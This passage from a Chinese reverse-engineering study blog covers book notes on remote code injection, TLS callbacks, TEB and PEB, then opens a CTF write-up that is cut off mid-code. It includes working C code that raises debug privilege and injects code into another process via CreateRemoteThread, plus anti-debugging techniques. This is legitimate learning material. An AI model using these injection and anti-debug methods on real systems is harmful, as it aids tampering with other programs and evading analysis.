class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); <span class="comment">//一直等待上面的线程结束，发出信号。</span></span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <span class="comment">//进行提权。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The token does not have the specified privilege. \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n USAGE  : %s &lt;pid&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向notepad注入显示一个对话框的代码并调试注入代码：</p><p>首先查看将notepad加载入OD并运行，然后使用Process Explorer进程管理查看notepad的PID；OD中设置事件终止在新的线程（<strong>即我们在另一个程序使用CreateRemoteThread()在notepad中创建的线程</strong>）。</p><p>开始注入，OD中成功暂停在新的线程。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163730590.png" alt="image-20200917163730590"></p><p>成功。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163853250.png" alt="image-20200917163853250"></p><p>另外有一个注意的就是，使用VS编译上面的代码时一定要选release编译选项，不然会注入失败。。原因之一是：release编译选项的编译的exe中二进制代码函数的顺序与源代码中的一致，这样就能使用后一个函数减前一个函数获得函数的大小。其他原因暂时不知道。。。</p><p>最后，win32编程要多熟悉熟悉才行。。</p><hr><h2 id="第四十一章-ASLR"><a href="#第四十一章-ASLR" class="headerlink" title="第四十一章 ASLR"></a>第四十一章 ASLR</h2><p>总结在其他帖子：<strong><a href="http://www.bxnop.cn/2020/05/12/ASLR/" target="_blank" rel="noopener">http://www.bxnop.cn/2020/05/12/ASLR/</a></strong></p><hr><h2 id="第四十五章-TLS回调函数"><a href="#第四十五章-TLS回调函数" class="headerlink" title="第四十五章 TLS回调函数"></a>第四十五章 TLS回调函数</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>TLS是各线程的独立的数据存储空间，用来保存变量或回调函数。使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样。</p><p>TLS回调函数是指，每当创建或终止进程时，TLS回调函数都会自动调用执行，前后共2次，执行进程的主线程（运行进程的EP代码）前，TLS回调函数会先别调用执行，这使得该特征应用于反调试技术。</p><p>若编程中启用了TLS功能，PE头文件就会设置TLS表（TLS Table）项目，即可选头中的<strong>IMAGE_DATA-DRRECTORY[9]</strong>记录了TLS表的RVA与SIZE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD StartAddressOfRawData; <span class="comment">//TLS静态数据开始地址</span></span><br><span class="line">    DWORD EndAddressOfRawData; <span class="comment">//TLS静态数据结束地址</span></span><br><span class="line">    DWORD AddressOfIndex; <span class="comment">//PDWORD</span></span><br><span class="line">    DWORD AddressOfCallBacks; <span class="comment">//PIMAGE_TLS_CALLBACK * ，执行函数指针(VA)数组。</span></span><br><span class="line">    DWORD SizeOfZeroFill; <span class="comment">//直接填充为0的大小</span></span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 *PIMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line">静态数据总大小就是EndAddressOfRawData-StartAddressOfRawData+SizeOfZeroFill</span><br></pre></td></tr></table></figure><blockquote><p>IMAGE_TLS_DIRECTORY结构体有2种版本，分别为32位（大小：18h）与64位，但只是成员字节大小不一样。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TLS Callback回调函数的定义：</span><br><span class="line"><span class="keyword">typedef</span> VOID </span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DLLHandle,DWORD Reason,PVOID Reserved);</span><br><span class="line"></span><br><span class="line">其中参数Reason为调用回调函数的原因:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH 1 进程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH 2 线程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DERACH 3 线程退出</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH 0 进程退出</span></span><br></pre></td></tr></table></figure><h3 id="调试TLS回调函数"><a href="#调试TLS回调函数" class="headerlink" title="调试TLS回调函数"></a>调试TLS回调函数</h3><p>因为TLS回调函数在EP代码之前被调用执行了，直接使用调试器打开是无法调试的。</p><p>修改ollydbg的选项，让调试器暂停的位置是系统断点（System Startup Breakpoint）来调试TLS回调函数。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711093140091.png" alt="image-20200711093140091"></p><blockquote><p>在Ollydbg调试器的默认设置下，调试器会在EP处暂停，而WinDbg调试器默认在系统启动断点暂停。</p></blockquote><p>使用CFF explorer查看tls回调表回调函数的地址。可以看到有2个回调函数。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103234916.png" alt="image-20200711103234916"></p><p>使用olldbg advanced插件，打开暂停在回调函数的选项。F9运行。可以看到，和上面查看的回调函数地址一样。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711103428275.png" alt="image-20200711103428275"></p><h3 id="手工添加TLS回调函数"><a href="#手工添加TLS回调函数" class="headerlink" title="手工添加TLS回调函数"></a>手工添加TLS回调函数</h3><p>首先确定IMAGE_TLS_DIRECTORY结构体与TLS回调函数放到文件的那个位置。向PE文件添加代码或数据时，有三种方法：</p><blockquote><p>1.添加到节区的末尾的空白区域。2.增加最后一个节区的大小。3.在最后增加新节区。</p></blockquote><p>之前的内嵌打补丁使用的第1种方法，这里使用第二种。</p><p>查看最后一个节区的属性：<strong>注意section alignment:1000，file alignment:200</strong><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711105035280.png" alt="image-20200711105035280"></p><p>知道文件对齐单位是200，所以这里将最后一个节区大小增加200（即文件文件大小变为9200+200 = 9400），那需要修改最后一个节区的Raw Size从200增加到400。但是Virtual Size可以不修改，因为文件对齐单位是1000，加上200后也远小于1000的。</p><p>修改Raw Size：400。增加3个属性：1.节中包含代码；2.可执行；3.可写。</p><blockquote><p>20 IMAGE_SCN_CNT_CODE 节中包含代码</p><p>20000000 IMAGE_SCN_MEM_EXECUTE 可执行</p><p>80000000 IMAGE_SCN_MEM_WRITE 可写</p></blockquote><p>下面设置TLS表：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711110919960.png" alt="image-20200711110919960"></p><p>写入IMAGE_TLS_DIRECTORY结构体：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711115845463.png" alt="image-20200711115845463"></p><p>写入回调函数：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123118819.png" alt="image-20200711123118819"></p><p>成功：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711123251886.png" alt="image-20200711123251886"></p><hr><h2 id="第四十六章-TEB"><a href="#第四十六章-TEB" class="headerlink" title="第四十六章 TEB"></a>第四十六章 TEB</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>TEB：线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体。</p><p>TEB结构体中的重要成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x000</span> NtTib:_NT_TIB</span><br><span class="line">+<span class="number">0x030</span> ProcessEnvironmentBlock:Ptr32_PEB（指向PEB结构体的指针）</span><br></pre></td></tr></table></figure><p>NtTib成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EXCEPTION_REGISIRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125;NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure><p>ExceptionList成员指向EXCEPTION_REGISIRATION_RECORD结构体组成的链表，它用于Windows OS的SEH。</p><p>Self成员是_NT_TIB结构体的自引用指针，也是TEB结构体的指针（因为TEB结构体的第一个成员是_NT_TIB结构体）</p><h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>Ntdll.NtCurrentTeb（）API用来放回当前线程的TEB结构体的地址。</p><p>OD中载入一个程序，搜索该API并进入：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717205028466.png" alt="image-20200717205028466"></p><blockquote><p>TEB结构体的地址与FS段寄存器所指的段内存的基址是一样的。</p></blockquote><h3 id="FS段寄存器"><a href="#FS段寄存器" class="headerlink" title="FS段寄存器"></a>FS段寄存器</h3><p>FS段寄存器用来指示当前线程的TEB结构体。实际上，FS寄存器并非直接指向TEB结构体的地址，它持有SDT的索引，而该索引持有实际的TEB地址。</p><blockquote><p>SDT位于内核内存区域，其地址存储在特殊的寄存器GDTR(全局描述符表寄存器)中。</p></blockquote><p>上述示意图：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200717211000065.png" alt="image-20200717211000065"></p><p>由于段寄存实际存储的是SDT的索引，所以它也被称为“段选择符”，TEB结构体位于FS段选择符所指的段内存的起始地址处。</p><p>FS:[0x18] = TEB起始地址:</p><p><strong>FS:[0x18] = TEB.NtTib.Self = address of TIB = address of TEB = FS:0</strong></p><p>FS:[0x30] = PEB起始地址：</p><p><strong>FS:[0x30] = TEB.ProcessEnvironmentBlock = address of PEB</strong></p><p>FS:[0] = SEH起始地址：</p><p><strong>FS:[0] = TEB.NtTIb.ExceptionList = address of SEH</strong></p><hr><h2 id="第四十七章-PEB"><a href="#第四十七章-PEB" class="headerlink" title="第四十七章 PEB"></a>第四十七章 PEB</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>PEB：进程环境块，存放进程信息的结构体。</p><p>TEB结构体位于FS段选择符所指的段内存的起始地址处，而ProcessEnvironmentBlock成员位于距TEB结构体Offset 30位置，所以：FS:[30] = TEB.ProcessEnvironmentBlock = address of PEB</p><p>获取PEB的两种方法：</p><blockquote><p><strong>1.直接获取PEB地址：mov eax, dword ptr fs:[30];    fs:[30] = address of PEB</strong></p><p><strong>2。先获取TEB地址，再通过ProcessEnvironmentBlock成员+30偏移处获取：mov eax, dword pte fs:[18]; mov eax, dword ptr ds:[eax+30]</strong></p></blockquote><p>PEB中重要成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">002</span> BeingDebugged:UChar</span><br><span class="line">+<span class="number">008</span> ImageBaseAddress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c Ldr:Ptr32 _PEB_LDR_DATA</span><br><span class="line">+<span class="number">018</span> ProcessHeap:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">068</span> NtGlobalFlag:Uint4B</span><br></pre></td></tr></table></figure><h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><h4 id="PEB-BeingDebugged"><a href="#PEB-BeingDebugged" class="headerlink" title="PEB.BeingDebugged"></a>PEB.BeingDebugged</h4><p>Kernel32.dll中的Kernel32!IsDebuggerPresent（）API:该API通过检查PEB.BeingDebugged成员确定是否正在调试进程（是返回1，否返回0）：<code>Bool WINAPI IsDebuggerPresent(void);</code><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718102652664.png" alt="image-20200718102652664"></p><blockquote><p>Windows 7中，IsDebuggerPresent()API是在Kernelbase.dll中实现。而在Windows XP及以前的版本的操作系统中，它在Kernel32.dll中实现。</p></blockquote><h4 id="PEB-ImageBaseAddress"><a href="#PEB-ImageBaseAddress" class="headerlink" title="PEB.ImageBaseAddress"></a>PEB.ImageBaseAddress</h4><p>PEB.ImageBaseAddress成员用来表示进程的Imagebase：GetModuleHandle()API用来获取ImageBase<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718103540596.png" alt="image-20200718103540596"></p><h4 id="PEB-Ldr"><a href="#PEB-Ldr" class="headerlink" title="PEB.Ldr"></a>PEB.Ldr</h4><p>PEB.Ldr成员是指向_PEB_LDR_DATA结构体的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">000</span> Length:Uint4B</span><br><span class="line">+<span class="number">004</span> Initialized:UChar</span><br><span class="line">+<span class="number">008</span> SsHandle:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c InLoadOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">014</span> InMemoryOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">01</span>c InInitializationOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">024</span> EntryInProgress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">028</span> ShutdownInProgress:UChar</span><br><span class="line">+<span class="number">02</span>c ShutdownThreadId:Ptr32 <span class="keyword">void</span></span><br></pre></td></tr></table></figure><blockquote><p>当模块（DLL）被加载到进程，通过PEB.Ldr成员可以直接获取该模块的加载基地址。</p></blockquote><p>_PEB_LDR_DATA结构体成员中有3个_LIST_ENTRY类型的成员（上面已标出）：<strong>_LIST_ENTRY结构体提供了双向链表的机制</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125;LIST_ENTRY, *PLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>该链表中保存的信息：_LDR_DATA_TABLE_ENTRY结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PVOID Reserved[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserverd[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    Unicode_STRING FullDllName;</span><br><span class="line">    Byte Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><blockquote><p>每个加载到进程中的DLL模块都有与之对应的_LDR_DATA_TABLE_ENTRY结构体，这些结构体相互链接，最终形成_LIST_ENTRY双向链表。</p></blockquote><h4 id="PEB-ProcessHeap-amp-PEB-NtGlobalFlag"><a href="#PEB-ProcessHeap-amp-PEB-NtGlobalFlag" class="headerlink" title="PEB.ProcessHeap &amp; PEB.NtGlobalFlag"></a>PEB.ProcessHeap &amp; PEB.NtGlobalFlag</h4><p>PEB.ProcessHeap和PEB.NtGlobalFlag（像PEB.BeingDebugged一样）应用于反调试结束。若进程处于调试状态，则ProcessHeap于NtGlobalFlag成员就持有特定值。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年DASCTF六月线上赛</title>
      <link href="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>学习、学习<a id="more"></a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><ul><li><p>64位elf文件加了upx壳，脱壳后载入ida中发现伪代码不好看，就直接看汇编。就三个检查函数。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626120857536.png" alt="image-20200626120857536"></p></li><li><p>chk1：可以看到，只要知道栈中<strong>rbp-20h</strong>的内容即可。这里直接看或者动调都简单。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121531469.png" alt="image-20200626121531469"></p></li><li><p>chk2：与ch1同理。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121844498.png" alt="image-20200626121844498"></p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626125833587-1593226438013.png" alt="image-20200626125833587"></p></li><li><p>chk3：与上同理。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121936155.png" alt="image-20200626121936155"></p></li><li><p>最后将得到的数据结合起来即可：<strong>c92bb6a5a6c3009124566d882d4bc7ee</strong></p></li></ul><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a>easy_maze</h3><ul><li><p>64位elf文件，载入ida中看一下，知道是迷宫题，所以目标是明确的。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141730876.png" alt="image-20200626141730876"></p></li><li><p>可以知道刚开始列和行都是0，下面找迷宫图。先随便看一个操作函数。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141924284.png" alt="image-20200626141924284"></p></li><li><p>查看byte_400AE0：把数据提取出来。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142111607.png" alt="image-20200626142111607"></p></li><li><p>用C语言将图打印出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span 